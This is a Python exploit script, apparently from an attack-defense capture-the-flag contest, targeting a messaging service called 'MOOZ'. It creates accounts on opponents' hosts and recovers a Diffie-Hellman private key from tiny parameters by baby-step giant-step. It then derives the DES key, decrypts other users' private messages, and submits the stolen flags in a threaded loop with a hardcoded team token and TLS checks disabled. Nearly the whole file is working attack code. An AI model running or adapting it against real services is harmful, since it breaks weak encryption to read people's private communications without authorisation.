#/usr/bin/python3

import requests, time, re
import getopt
import sys
from math import sqrt, ceil
import datetime
from Crypto.Cipher import DES
import os, math, base64
import json
import urllib3, string, random
from threading import Thread, Lock

TEAM_TOKEN = "ddfe3c79ffdb518891f4f82ea90b433f"		# TEAM_TOKEN INVIATO PER EMAIL
CHALLENGE_NAME = "MOOZ"		                        # NOME DELLA CHALLENGE INDICATO IN flagIds

flags = []
threads = []
lock = Lock()

G = 128
P = 3793

def generate_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def get_public(private):
    return pow(G, private, P)

def get_symmetric(publicB, privateA,P):
    return pow(publicB, privateA, P)

# symmetric encr
def get_selected_cipher(symkey):
    # trim key to 7 bytes
    if ((len(bin(symkey))-2) > 56):
        symkey = symkey & 0xffffffffffffff
    return DES.new(symkey.to_bytes(8,byteorder='little'), DES.MODE_ECB)

def encrypt(cleartext, symkey):
    selected_cipher = get_selected_cipher(symkey)
    cleartext_length = len(cleartext)
    next_multiple_of_8 = 8 * math.ceil(cleartext_length/8)
    padded_cleartext = cleartext.ljust(next_multiple_of_8)
    raw_ciphertext = selected_cipher.encrypt(padded_cleartext.encode())
    return base64.b64encode(raw_ciphertext).decode('utf-8')

def decrypt(ciphertext,symkey):
    selected_cipher = get_selected_cipher(symkey)
    raw_ciphertext = base64.b64decode(ciphertext)
    decrypted_message_with_padding = selected_cipher.decrypt(raw_ciphertext)
    return decrypted_message_with_padding.rstrip(b'\x00').decode('utf-8')



def solveDLOG(h, g, p):
    timeStart = datetime.datetime.now()
    N = ceil(sqrt(p - 1))
    f = pow(g, (N*(p-2)), p)
    babyStep = calcBabyStep(g, p, N)
    
        #print("BabySteps: Too many for printing")
    sol = calcGiantAndCompare(h, f, N, p, babyStep, timeStart)
    return sol


def calcBabyStep(g, p, N):
    babyStep = {1: 0, g: 1}
    lastValue = g
    #print()
    for i in range(2, N):
        newValue = (lastValue * g) % p
        babyStep[newValue] = i
        lastValue = newValue
    return babyStep


def calcGiantAndCompare(h, f, N, p, babyStep, timeStart):
    lastInsert = (h * f) % p
    giantStep = {0: h, 1: lastInsert}

    if h in babyStep.keys():
        solution = babyStep.get(h)
        timeEnd = datetime.datetime.now()
        timeDelta = timeEnd - timeStart
        #print("GiantSteps up to Solution: " + str(giantStep))
        #print("\nSolution x = " + str(solution))
        return str(solution)

    elif lastInsert in babyStep:
        solution = babyStep[lastInsert] + 1 * N
        timeEnd = datetime.datetime.now()
        timeDelta = timeEnd - timeStart
        #print("GiantSteps up to Solution: " + str(giantStep))
        #print("\nSolution x = " + str(solution))
        return str(solution)

    for j in range(2, N):
        nextInsert = (lastInsert * f) % p
        giantStep[j] = nextInsert
        if nextInsert in babyStep.keys():
            solution = babyStep.get(nextInsert) + j * N
            timeEnd = datetime.datetime.now()
            timeDelta = timeEnd - timeStart

            #print("\nSolution x = " + str(solution))
            #print("Calculation took " + str(timeDelta.total_seconds()) + " Seconds")
            return str(solution)
        lastInsert = nextInsert
    timeEnd = datetime.datetime.now()
    timeDelta = timeEnd - timeStart
    #print ("\nNo Solution found!")
    #print("Calculation took " + str(timeDelta.total_seconds()) + " Seconds")






class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit(flagids):
	c = 1
	i = 0
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		threads.append(Attacker(ip, flagids))
		threads[i].start()

		i += 1
		c += 1
	
	for i in range(size):
		threads[i].join()
			
	
def get_flag(ip, hint):
    users=json.loads(hint)
    me=users['user1']
    de=users['user2']

    s=requests.Session()
    username = generate_random_string(8)
    email = username + "@email.com"
    password = "asdjkashdjkah"

    datas = {
        "username": username,
        "email": email,
        "password": password
    }
    r = s.post("https://"+ip+"/auth/register", json=datas, verify=False, timeout=10)

    datas = {
        "email": email,
        "password": password
    }
    r = s.post("https://"+ip+"/auth/login", json=datas, verify=False, timeout=10)
        
    r=s.get("https://"+ip+"/auth/users", verify=False, timeout=10).json()
    utenti=r['users']
    mittente=None
    destinatario=None
    for utente in utenti:
        if(me==utente["email"]):
            mittente=str(utente['id'])
        elif(de==utente["email"]):
            destinatario=str(utente['id'])
        if(mittente and destinatario):
            break


    r=s.get("https://"+ip+"/crypto/get_params", verify=False, timeout=10).json()
    p=int(r['params']['p'])
    g=int(r['params']['g'])

    if(p!=3793 and g!=128):
        raise ValueError('Ferma_tutto')   

    r=s.get("https://"+ip+"/crypto/get_public/"+mittente, verify=False, timeout=10).json()
    #print(r)
    public_mitt=int(r['public'])
    if(public_mitt > 10000):
        raise ValueError('Ferma_tutto')  

    r=s.get("https://"+ip+"/crypto/get_public/"+destinatario, verify=False, timeout=10).json()
    #print(r)
    public_dest=int(r['public'])
    if(public_dest > 10000):
        raise ValueError('Ferma_tutto')  

    privato_mitt=int(solveDLOG(public_mitt,g,p))

    #tmp=int(solveDLOG(public_dest,p,g))
    symm=int(get_symmetric(public_dest,privato_mitt,p))

    r=s.get("https://"+ip+"/messages/"+mittente+"/"+destinatario, verify=False, timeout=10).json()
    #print(r)
    cypher=r['data']

    #print(json.loads(decrypt(cypher, symm))[0]['body'])
    return json.loads(decrypt(cypher, symm))[0]['body']
	
	


## TEST get_flag
# hint = "rLLxSL@mail.com"
# flag = get_flag("10.60.85.1", username)
# print(flag)
# exit()



# Disabilita la stampa del InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# EXPLOIT FINALE
while True:
	flags = []
	threads = []

	print("Running exploit...")
	flagids = requests.get("http://10.10.0.1:8081/flagIds").json()
	exploit(flagids)
	print(flags)
	
	print("Putting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
	print(r)
	print("Exploit ok...\nRepeat...")
	print("\n")

	time.sleep(60)




